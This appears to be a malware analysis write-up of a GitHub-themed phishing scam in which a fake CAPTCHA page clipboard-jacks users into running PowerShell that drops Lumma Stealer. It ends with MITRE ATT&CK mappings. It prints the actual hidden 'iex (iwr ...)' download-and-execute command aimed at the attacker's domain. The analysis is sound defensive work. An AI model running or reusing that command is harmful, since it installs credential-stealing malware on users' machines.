# Github Scanner Scam

Hello everybody, there is this new scam that's been going around and it has couple of forms but this one that we're talking about on this document is the Github version of it 
which has been targetting the creators and maintainers of open source repositories & they're probably hoping to get their credentials so then they could turn 
their open sourced repositories into a supply chain attack, this is all started when my friend showed me an phishing email that he recieved

![1](./Photos/1.png)

The first thing I noticed is that it is an obvious phishing mail because that right there is not the official domain of Github.

The second thing i noticed is the sense of urgency (example: "immediate action required" etc. etc.)

Let's go ahead an investigate what is really going on, so I open up the website then I see the "I'm not a robot" button

![2](./Photos/2.png)

I click on it and this is what happens

![3](./Photos/3.png)

This kind of prompt is often phishing because legitimate websites won't ask you to run commands directly on your computer like this especially through a Run prompt in Windows.

Now for the sake of investigating, I'm gonna go ahead and follow it, so Windows button + R and then CTRL + V and then Enter

![4](./Photos/4.png)

Look at the end we've got "I'm not a robot" and "reCAPTCHA Verification" and they even give you a number which doen't change by the way.

So we open up a hidden Power Shell and we execute code, let's go ahead & execute it & see what happens, I intercepted an endpoint

![5](./Photos/5.png)

this endpoint contains a PowerShell script that is downloading and running an executable from the suspicious website, let me explain how this script works:

- It creates a WebClient object which is used to download the file from the internet.
- It sets the URL to https://github-scanner.com/l6E.exe, which is the source of the executable file being downloaded.
- It specifies a local file path ($env:TEMP\SysSetup.exe) which saves the file in the TEMP directory under the name SysSetup.exe.
- It uses the WebClient.DownloadFile method to download the executable from the URL and save it to the specified path.
- Finally it runs the downloaded executable using the Start-Process command.

But for the sake of investigating let's go ahead and download the executable

![6](./Photos/6.png)

After executing it seems that it already hit some ``.shop`` domains in DNS

![domains](./Photos/domains.png)

It seems like while the dropper and the distribution for this malware is still online but the actual C2 servers are not online meaning that the Lumma Stealer is still being dropped but it doesn't actually execute.

![8](./Photos/8.png)

if you don't already know what Lumma Stealer does basically:

Lumma Stealer is a type of information-stealing malware designed to collect sensitive data from infected systems, including saved browser passwords, credit card information & cryptocurrency wallet credentials. 
It operates stealthily & often avoiding detection & it can exfiltrate the data to a remote server controlled by attackers. 
In this case the Lumma Stealer could allow attackers to compromise developer credentials and potentially turn open-source repositories into malicious distribution points.

Now let's go ahead & see if there is any persistence from the malware, the ones that are most likely going to be abused is task scheduler

![9](./Photos/9.png)

So far I don't see any obvious signs of persistence which makes sense because Lumma Stealer is a very stealthy stealer

The first stage of the malware's architecture is .NET and it was obfuscated.

Obfuscation is the practice of deliberately making code difficult to understand. 
Malware developers use obfuscation to hide malicious functionality and making it harder for security researchers or antivirus software to detect and reverse-engineer the code. 
This is commonly done by using meaningless variable names, complex control flow and encryption of key strings or data.

After deobfuscating let's go ahead and see what we have here

![10](./Photos/10.png)

We see here we have a bunch of DLLs that are being imported. .NET has the ability to what we might call "Native code" like the basic lower level Windows code

These lines indicate that the malware is interacting with several Windows API functions specifically

- Kernel32.dll for functions like FreeConsole and VirtualProtect which are typically used for memory management and modifying memory permissions/protection.
- User32.dll for calling Windows-specific functions.

VirtualProtect is often used in malware for changing memory protection to allow executing previously non-executable memory regions, potentially for injecting code or evading security measures.

Other methods like LoadLibraryA and CallWindowProcW are also used in process injection or hooking which is commonly found in malicious softwares.

First of all we have this for loop

![11](./Photos/11.png)

we can see its doing some sort of manipulation & xoring a bunch of data

Then we have the entry point of the program appears in the Main method which is the unpack processs

![12](./Photos/12.png)

Task.Run(): This asynchronous task runs some PersonalActivation() methods and a few other operations including a call to VirtualProtect which changes memory permissions (again this is commonly seen in malware).

A Thread.Sleep(1000) is also used to pause execution for 1 second before continuing.

Then we see the virtual protect 

``cs
Program.VirtualProtect(ref Program.AIOssncoiuuA[0], Program.AIOssncoiuuA.length, 64U, ref num);
``

The ``64u`` part here is going to become an executable code

![13](./Photos/13.png)

Let's setup a breakpoint after that is called we should be able to get the memory, so we basically edit the packer to turn it into an unpacker that doesn't actually execute the code

![14](./Photos/14.png)

![15](./Photos/15.png)

We can see some stuff here but no dissassembly but it did get detected as a shellcode

![16](./Photos/16.png)

The 2nd one got detected as a 64 bit, let's see why

![17](./Photos/17.png)

As we can see it is clearly an PE

![DIE](./Photos/DIE.png)

Althought it has been detected as pure assembly that could be because it's shellcode

And now we have what looks quite valid althought it is probably still not the final stage of this

![20](./Photos/19.png)

The reason of this because I don't see any kind of indication, no domains etc.

![20](./Photos/20.png)

Let's go back to the website and view its code for the "I'm not a robot" and how it works

![21](./Photos/21.png)

The script is attaching an event listener to the button with the ID "verifyButton". When this button is clicked it triggers a series of actions.

The key action being performed is the execution of a hidden PowerShell command:

``
powershell.exe -w hidden -Command "iex (iwr 'https://github-scanner.com/download.txt').Content"
``

This PowerShell command uses Invoke-Expression (iex) to download and execute the contents of a remote file (download.txt) from the URL https://github-scanner.com.

This file contains malicious commands (as seen in the previous screenshots) which would be executed on the user's machine without their knowledge.

After downloading the file and running the PowerShell command the script then creates a text area element and sets its value to captchaText which is some pre-determined verification or a cover/decoy text.
The script then automatically selects this text & copies it to the clipboard (AKA ClipboardJacking) & removes the temporary text area from the document. 
This kind of clipboard manipulation is often used in scams to trick users into pasting harmful code elsewhere without realizing it.

The clipboard is suprisingly unprotected, so yeah websites can just modify your clipboard, in my opinion a potential security risks for a few reasons.

CAPTCHA and Verification:

The script mimics a CAPTCHA verification by adding a string "I am not a robot - reCAPTCHA Verification ID: 93752". 

This is a fake message that is used to make users believe they are completing a legitimate verification process while in reality the harmful PowerShell command is being executed in the background.

So in short this script is extremely malicious. because it attempts to:

- Download and execute a file via PowerShell, which could contain malware.
- Manipulate the clipboard to potentially trick users into pasting harmful code elsewhere.
- Fake a CAPTCHA verification to make the process appear legitimate.

After going through VT it does get detected as Lumma Stealer once we have unpacked a few layers, we also can see "Zard packer" detection

![22](./Photos/21.png)

## Conclusion

In conclusion this GitHub Scanner Scam serves as a reminder of the evolving threats. 

By staying vigilant & adopting to security best practices & using available tools like 2FA and signed commits developers can protect themselves and their projects from becoming victims of supply chain attacks. 

Always be cautious of phishing emails and suspicious websites and if in doubt never run scripts or commands from unverified sources. 

any legitimate Captcha will never ask you to run a PowerShell script on your system.

------
# MITRE ATT&CK TTPs (Indicators)

### Execution (TA0002)

- **[T1106: Native API](https://attack.mitre.org/techniques/T1106/)**  
  Adversaries interact with the native OS API (e.g., Windows API) to execute behaviors, such as manipulating memory permissions with `VirtualProtect`.
  
- **[T1129: Shared Modules](https://attack.mitre.org/techniques/T1129/)**  
  Adversaries execute malicious payloads via loading shared modules, abusing legitimate processes to load their malicious DLLs.

### Persistence (TA0003)

- **[T1574: Hijack Execution Flow](https://attack.mitre.org/techniques/T1574/)**  
  Persistence is achieved by hijacking the execution flow. Specifically, DLL side-loading (T1574.002) is used to inject malicious DLLs into legitimate applications.

### Privilege Escalation (TA0004)

- **[T1055: Process Injection](https://attack.mitre.org/techniques/T1055/)**  
  Memory in foreign processes is allocated, allowing the injection of malicious PE files. This allows adversaries to elevate privileges and evade defenses.
  
- **[T1574: Hijack Execution Flow (DLL Side-Loading)](https://attack.mitre.org/techniques/T1574/002/)**  
  DLL side-loading is used again here for privilege escalation by loading malicious DLLs into trusted processes.

### Defense Evasion (TA0005)

- **[T1027: Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027/)**  
  Obfuscation techniques are used, including software packing (T1027.002), where the binary contains packed or encrypted code, making it harder to analyze.

- **[T1055: Process Injection](https://attack.mitre.org/techniques/T1055/)**  
  Code injection is used to evade process-based defenses, similar to Privilege Escalation.

- **[T1070: Indicator Removal](https://attack.mitre.org/techniques/T1070/)**  
  Adversaries may modify artifacts (e.g., logs) and manipulate the Windows Registry (T1112) to cover their tracks or hide their presence.

- **[T1497: Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497/)**  
  The malware employs long sleep loops and memory allocation techniques to evade dynamic analysis in sandbox environments.

### Impair Defenses (TA0005)

- **[T1562.001: Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001/)**  
  Security tools may be disabled or modified. The use of guard pages prevents reverse engineering and debugging.

- **[T1564.003: Hidden Windows](https://attack.mitre.org/techniques/T1564/003/)**  
  Hidden windows are used to conceal malicious activity from users.

### Credential Access (TA0006)

- **[T1056: Input Capture](https://attack.mitre.org/techniques/T1056/)**  
  A DirectInput object is created to capture keystrokes, potentially stealing credentials and other sensitive information.

### Discovery (TA0007)

- **[T1012: Query Registry](https://attack.mitre.org/techniques/T1012/)**  
  The Windows Registry is queried to gather information about the system configuration and installed software.

- **[T1057: Process Discovery](https://attack.mitre.org/techniques/T1057/)**  
  The malware attempts to gather information about running processes to identify security tools or high-value targets.

- **[T1497: Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497/)**  
  Adversaries employ sleep loops and memory allocation techniques to evade analysis in virtual environments.

### Collection (TA0009)

- **[T1005: Data from Local System](https://attack.mitre.org/techniques/T1005/)**  
  Local system sources are searched for sensitive data, such as configuration files and credentials, before exfiltration.

### Command and Control (TA0011)

- **[T1071: Application Layer Protocol](https://attack.mitre.org/techniques/T1071/)**  
  HTTPS is used for encrypted command-and-control (C2) communication, blending in with legitimate traffic to avoid detection.

- **[T1573: Encrypted Channel](https://attack.mitre.org/techniques/T1573/)**  
  HTTPS is also used for network communication, making it more difficult for network monitoring tools to detect malicious C2 traffic.

### Impact (TA0040)

- **[T1485: Data Destruction](https://attack.mitre.org/techniques/T1485/)**  
  Data or files may be destroyed to disrupt the system or hinder recovery efforts.
